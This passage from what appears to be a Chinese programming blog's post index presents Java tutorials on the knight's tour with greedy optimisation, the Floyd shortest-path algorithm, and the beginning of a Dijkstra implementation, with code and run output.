class="line">ps.add(<span class="keyword">new</span> <span class="title class_">Point</span>(p1));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ps;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215032.png"></p><p><strong>运行结果：</strong></p><p>骑士周游算法，开始运行~~<br>共耗时: 31983 毫秒<br>1811163181364<br>1027271215419<br>53249281766314<br>263952236229205<br>4354253851223330<br>4057426132354821<br>5544595037463134<br>5841564560493647</p><hr><h2 id="算法优化"><a href="#算法优化" class="headerlink" title="算法优化"></a>算法优化</h2><p>马儿不同的走法（策略），会得到不同的结果，效率也会有影响。</p><p>上面的策略就是按照5,6,7,0,1,2,3,4的顺序来走。</p><p>使用贪心算法对原来的算法优化，我们需要对<strong>ps 中所有的Point 的下一步的所有集合的数目</strong>，进行非递减排序即可。</p><p><strong>关于数据结构中非递减 递减 非递增 递增</strong></p><blockquote><p>非递减就是a[i]&lt;&#x3D;a[i+1]</p><p>递减就是a[i]&gt;a[i+1]</p><p>非递增就是a[i]&gt;&#x3D;a[i+1]</p><p>递增就是a[i]&lt;a[i+1]</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">travelChessboard</span><span class="params">(<span class="type">int</span>[][] chessboard, <span class="type">int</span> row, <span class="type">int</span> column, <span class="type">int</span> step)</span> &#123;</span><br><span class="line">chessboard[row][column] = step;</span><br><span class="line">visited[row][column] = <span class="literal">true</span>; </span><br><span class="line">ArrayList&lt;Point&gt; ps = next(<span class="keyword">new</span> <span class="title class_">Point</span>(row, column));</span><br><span class="line">sort(ps);<span class="comment">//对ps中的point进行排序</span></span><br><span class="line"><span class="keyword">while</span> (!ps.isEmpty()) &#123;</span><br><span class="line"><span class="type">Point</span> <span class="variable">p</span> <span class="operator">=</span> ps.remove(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (visited[p.x][p.y] == <span class="literal">false</span>) &#123;</span><br><span class="line">travelChessboard(chessboard, p.x, p.y, step + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (step &lt; ROW * COLUMN &amp;&amp; finished == <span class="literal">false</span>) &#123;</span><br><span class="line">chessboard[row][column] = <span class="number">0</span>;</span><br><span class="line">visited[row][column] = <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">finished = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据当前这个一步的所有的下一步的选择位置，进行非递减排序, 减少回溯的次数</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">(ArrayList&lt;Point&gt; ps)</span> &#123;</span><br><span class="line">ps.sort(<span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;Point&gt;() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Point o1, Point o2)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">count1</span> <span class="operator">=</span> next(o1).size();</span><br><span class="line"><span class="type">int</span> <span class="variable">count2</span> <span class="operator">=</span> next(o2).size();</span><br><span class="line"><span class="keyword">return</span> count1 - count2;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p>骑士周游算法，开始运行~~<br>共耗时: 48 毫秒<br>11637323184722<br>38312174821419<br>1536495433642346<br>303960355053205<br>6114555263344524<br>40296259565169<br>135827421182544<br>284112572643107</p><h2 id="关于compa方法的返回值"><a href="#关于compa方法的返回值" class="headerlink" title="关于compa方法的返回值"></a>关于compa方法的返回值</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> count1 - count2;<span class="comment">//升序</span></span><br><span class="line">等价于</span><br><span class="line">    <span class="keyword">if</span>(count1 &lt; count2) &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (count1 == count2) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> -(count1 - count2);<span class="comment">//降序</span></span><br><span class="line">等价于</span><br><span class="line">    <span class="keyword">if</span>(count1 &lt; count2) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (count1 == count2) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 马踏棋盘算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>弗洛伊德算法</title>
      <link href="/posts/7ab0/"/>
      <url>/posts/7ab0/</url>
      
        <content type="html"><![CDATA[<h1 id="弗洛伊德算法"><a href="#弗洛伊德算法" class="headerlink" title="弗洛伊德算法"></a>弗洛伊德算法</h1><h2 id="应用场景-最短路径问题"><a href="#应用场景-最短路径问题" class="headerlink" title="应用场景-最短路径问题"></a>应用场景-最短路径问题</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215704.png"></p><p>胜利乡有7个村庄(A, B, C, D, E, F, G)</p><p>各个村庄的距离用边线表示(权) ，比如 A – B 距离 5公里</p><p>问：如何计算出<strong>各村庄到 其它各村庄</strong>的最短距离? </p><h2 id="弗洛伊德算法基本介绍"><a href="#弗洛伊德算法基本介绍" class="headerlink" title="弗洛伊德算法基本介绍"></a>弗洛伊德算法基本介绍</h2><ol><li>和Dijkstra算法一样，弗洛伊德(Floyd)算法也是一种用于寻找给定的加权图中顶点间最短路径的算法。该算法名称以创始人之一、1978年图灵奖获得者、斯坦福大学计算机科学系教授罗伯特·弗洛伊德命名。</li><li>弗洛伊德算法(Floyd)计算图中<strong>各个顶点之间的最短路径</strong>。</li><li>迪杰斯特拉算法用于计算图中某<strong>一个顶点到其他顶点的最短路径</strong>。</li><li>弗洛伊德算法 VS 迪杰斯特拉算法：迪杰斯特拉算法通过选定的被访问顶点，求出从出发访问顶点到其他顶点的最短路径；弗洛伊德算法中每一个顶点都是出发访问点，所以需要将每一个顶点看做被访问顶点，求出从每一个顶点到其他顶点的最短路径。</li></ol><hr><p><strong>基本思想：</strong></p><p>弗洛伊德算法定义了两个二维矩阵：</p><ol><li>矩阵D记录顶点间的最小路径<br>例如D[0] [3]&#x3D; 10，说明顶点 0 到 3 的最短路径为10；</li><li>矩阵P记录顶点间最小路径中的中转点<br>例如P[0] [3]&#x3D; 1，说明顶点 0 到 3的最短路径轨迹为：0 -&gt; 1 -&gt; 3。</li></ol><p>它通过3重循环，k为中转点，v为起点，w为终点，循环比较D[v] [w] 和 D[v] [k]+ D[k] [w]最小值，如果 D[v] [k]+ D[k] [w]为更小值，则把 D[v] [k]+ D[k] [w]覆盖保存在D[v] [w] 中。</p><p>至于 v 到 k 的最短路径或者 k 到 w 的最短路径也是以同样的方式获得。</p><hr><p>图解思路如下：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214958.png"></p><h2 id="最短路径问题的代码实现"><a href="#最短路径问题的代码实现" class="headerlink" title="最短路径问题的代码实现"></a>最短路径问题的代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.floyd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FloydAlgorithm</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>[] vertex = &#123; <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span> &#125;;</span><br><span class="line"><span class="comment">// 创建邻接矩阵</span></span><br><span class="line"><span class="type">int</span>[][] matrix = <span class="keyword">new</span> <span class="title class_">int</span>[vertex.length][vertex.length];</span><br><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="variable">N</span> <span class="operator">=</span> <span class="number">65535</span>;</span><br><span class="line">matrix[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; <span class="number">0</span>, <span class="number">5</span>, <span class="number">7</span>, N, N, N, <span class="number">2</span> &#125;;</span><br><span class="line">matrix[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; <span class="number">5</span>, <span class="number">0</span>, N, <span class="number">9</span>, N, N, <span class="number">3</span> &#125;;</span><br><span class="line">matrix[<span class="number">2</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; <span class="number">7</span>, N, <span class="number">0</span>, N, <span class="number">8</span>, N, N &#125;;</span><br><span class="line">matrix[<span class="number">3</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; N, <span class="number">9</span>, N, <span class="number">0</span>, N, <span class="number">4</span>, N &#125;;</span><br><span class="line">matrix[<span class="number">4</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; N, N, <span class="number">8</span>, N, <span class="number">0</span>, <span class="number">5</span>, <span class="number">4</span> &#125;;</span><br><span class="line">matrix[<span class="number">5</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; N, N, N, <span class="number">4</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span> &#125;;</span><br><span class="line">matrix[<span class="number">6</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; <span class="number">2</span>, <span class="number">3</span>, N, N, <span class="number">4</span>, <span class="number">6</span>, <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 Graph 对象</span></span><br><span class="line"><span class="type">Graph</span> <span class="variable">graph</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Graph</span>(matrix, vertex);</span><br><span class="line">graph.floyd();</span><br><span class="line">graph.show();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建图</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Graph</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="type">char</span>[] vertex; <span class="comment">// 存放顶点的数组</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span>[][] dis; <span class="comment">// 保存从各个顶点出发到其它顶点的距离</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span>[][] relay;<span class="comment">// 保存到达目标顶点的中转顶点</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Graph</span><span class="params">(<span class="type">int</span>[][] matrix, <span class="type">char</span>[] vertex)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.vertex = vertex;</span><br><span class="line"><span class="built_in">this</span>.dis = matrix;</span><br><span class="line"><span class="built_in">this</span>.relay = <span class="keyword">new</span> <span class="title class_">int</span>[vertex.length][vertex.length];</span><br><span class="line"><span class="comment">// 对relay数组初始化, 注意存放的是中转顶点的下标</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; vertex.length; i++) &#123;</span><br><span class="line">Arrays.fill(relay[i], i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">floyd</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; dis.length; i++) &#123;<span class="comment">// 中转顶点</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; dis.length; j++) &#123;<span class="comment">// 出发顶点</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; dis.length; k++) &#123;<span class="comment">// 终点</span></span><br><span class="line"><span class="keyword">if</span> (dis[j][i] + dis[i][k] &lt; dis[j][k]) &#123;</span><br><span class="line">dis[j][k] = dis[j][i] + dis[i][k];</span><br><span class="line">relay[j][k] = relay[i][k];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; dis.length; k++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; dis.length; i++) &#123;</span><br><span class="line">System.out.print(vertex[relay[k][i]] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; dis.length; i++) &#123;</span><br><span class="line">System.out.print(<span class="string">&quot;(&quot;</span> + vertex[k] + <span class="string">&quot;到&quot;</span> + vertex[i] + <span class="string">&quot;的最短路径是&quot;</span> + dis[k][i] + <span class="string">&quot;) &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p>A A A F G G A (A到A的最短路径是0) (A到B的最短路径是5) (A到C的最短路径是7) (A到D的最短路径是12) (A到E的最短路径是6) (A到F的最短路径是8) (A到G的最短路径是2) </p><p>B B A B G G B (B到A的最短路径是5) (B到B的最短路径是0) (B到C的最短路径是12) (B到D的最短路径是9) (B到E的最短路径是7) (B到F的最短路径是9) (B到G的最短路径是3) </p><p>C A C F C E A (C到A的最短路径是7) (C到B的最短路径是12) (C到C的最短路径是0) (C到D的最短路径是17) (C到E的最短路径是8) (C到F的最短路径是13) (C到G的最短路径是9) </p><p>G D E D F D F (D到A的最短路径是12) (D到B的最短路径是9) (D到C的最短路径是17) (D到D的最短路径是0) (D到E的最短路径是9) (D到F的最短路径是4) (D到G的最短路径是10) </p><p>G G E F E E E (E到A的最短路径是6) (E到B的最短路径是7) (E到C的最短路径是8) (E到D的最短路径是9) (E到E的最短路径是0) (E到F的最短路径是5) (E到G的最短路径是4) </p><p>G G E F F F F (F到A的最短路径是8) (F到B的最短路径是9) (F到C的最短路径是13) (F到D的最短路径是4) (F到E的最短路径是5) (F到F的最短路径是0) (F到G的最短路径是6) </p><p>G G A F G G G (G到A的最短路径是2) (G到B的最短路径是3) (G到C的最短路径是9) (G到D的最短路径是10) (G到E的最短路径是4) (G到F的最短路径是6) (G到G的最短路径是0) </p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215704.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 弗洛伊德算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>迪杰斯特拉算法</title>
      <link href="/posts/ca64/"/>
      <url>/posts/ca64/</url>
      
        <content type="html"><![CDATA[<h1 id="迪杰斯特拉算法"><a href="#迪杰斯特拉算法" class="headerlink" title="迪杰斯特拉算法"></a>迪杰斯特拉算法</h1><h2 id="应用场景-最短路径问题"><a href="#应用场景-最短路径问题" class="headerlink" title="应用场景-最短路径问题"></a>应用场景-最短路径问题</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215704.png"></p><p>战争时期，胜利乡有7个村庄(A, B, C, D, E, F, G) ，现在有六个邮差，从G点出发，需要分别把邮件分别送到 A, B, C , D, E, F 六个村庄</p><p>各个村庄的距离用边线表示(权) ，比如 A – B 距离 5公里</p><p>问：如何计算出<strong>G村庄到 其它各个村庄的最短距离</strong>? </p><p>如果从其它点出发到各个点的最短距离又是多少?</p><h2 id="迪杰斯特拉算法基本介绍"><a href="#迪杰斯特拉算法基本介绍" class="headerlink" title="迪杰斯特拉算法基本介绍"></a>迪杰斯特拉算法基本介绍</h2><p>迪杰斯特拉(Dijkstra)算法是典型最短路径算法，用于计算一个结点到其他结点的最短路径。 它的主要特点是以起始点为中心向外层层扩展(广度优先搜索思想)，直到扩展到终点为止。</p><p><strong>基本思想：</strong></p><ol><li>引进两个集合S和U。S的作用是记录已求出最短路径的顶点(以及相应的最短路径长度)，而U则是记录还未求出最短路径的顶点(以及该顶点到起点s的距离)。</li><li>初始时，S只包含起点s；U包含除s外的其他顶点，且U中顶点的距离为”起点s到该顶点的距离”[例如，U中顶点v的距离为(s,v)的长度，如果s和v不相邻，则v的距离为∞]。</li><li>从U中选出”距离最短的顶点k”，并将顶点k加入到S中；同时，从U中移除顶点k。</li><li>更新U中各个顶点到起点s的距离。之所以更新U中顶点的距离，是由于上一步中确定了<strong>k是求出最短路径的顶点</strong>，从而可以利用k来更新其它顶点的距离；例如，(s,v)的距离可能大于(s,k)+(k,v)的距离。</li><li>重复步骤(3)和(4)，直到遍历完所有顶点。</li></ol><hr><p>图解思路如下：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200826203459.png"></p><p>以上图为例，来对迪杰斯特拉进行算法演示(以第4个顶点D为起点)。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214957.png"></p><h2 id="最短路径问题的代码实现"><a href="#最短路径问题的代码实现" class="headerlink" title="最短路径问题的代码实现"></a>最短路径问题的代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.dijkstra;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DijkstraAlgorithm</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">char</span>[] vertex = &#123; <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span> &#125;;</span><br><span class="line"><span class="comment">// 邻接矩阵</span></span><br><span class="line"><span class="type">int</span>[][] matrix = <span class="keyword">new</span> <span class="title class_">int</span>[vertex.length][vertex.length];</span><br><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="variable">N</span> <span class="operator">=</span> <span class="number">65535</span>;<span class="comment">// 表示不可以连接</span></span><br><span class="line">matrix[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; N, <span class="number">5</span>, <span class="number">7</span>, N, N, N, <span class="number">2</span> &#125;;</span><br><span class="line">matrix[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; <span class="number">5</span>, N, N, <span class="number">9</span>, N, N, <span class="number">3</span> &#125;;</span><br><span class="line">matrix[<span class="number">2</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; <span class="number">7</span>, N, N, N, <span class="number">8</span>, N, N &#125;;</span><br><span class="line">matrix[<span class="number">3</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; N, <span class="number">9</span>, N, N, N, <span class="number">4</span>, N &#125;;</span><br><span class="line">matrix[<span class="number">4</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; N, N, <span class="number">8</span>, N, N, <span class="number">5</span>, <span class="number">4</span> &#125;;</span><br><span class="line">matrix[<span class="number">5</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; N, N, N, <span class="number">4</span>, <span class="number">5</span>, N, <span class="number">6</span> &#125;;</span><br><span class="line">matrix[<span class="number">6</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; <span class="number">2</span>, <span class="number">3</span>, N, N, <span class="number">4</span>, <span class="number">6</span>, N &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Graph</span> <span class="variable">graph</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Graph</span>(vertex, matrix);</span><br><span class="line"><span class="type">Dijkstra</span> <span class="variable">djs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dijkstra</span>(graph, <span class="number">6</span>);</span><br><span class="line">djs.dijkstra();</span><br><span class="line">djs.show();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Graph</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="type">char</span>[] vertex; <span class="comment">// 顶点数组</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span>[][] matrix; <span class="comment">// 邻接矩阵</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造器</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Graph</span><span class="params">(<span class="type">char</span>[] vertex, <span class="type">int</span>[][] matrix)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.vertex = vertex;</span><br><span class="line"><span class="built_in">this</span>.matrix = matrix;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示图</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showGraph</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span>[] link : matrix) &#123;</span><br><span class="line">System.out.println(Arrays.toString(link));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dijkstra</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> startVertex;<span class="comment">// 源点，即计算&quot;源点startVertex&quot;到其它顶点的最短路径</span></span><br><span class="line"><span class="keyword">private</span> Graph graph;<span class="comment">// 图</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span>[] visited;<span class="comment">// 记录各个顶点是否访问过，1表示访问过，0未访问</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span>[] prev;<span class="comment">// prev[i]的值是&quot;顶点startVertex&quot;到&quot;顶点i&quot;的最短路径所经历的全部顶点中，位于&quot;顶点i&quot;之前的那个顶点</span></span><br><span class="line"><span class="keyword">private</span> <span 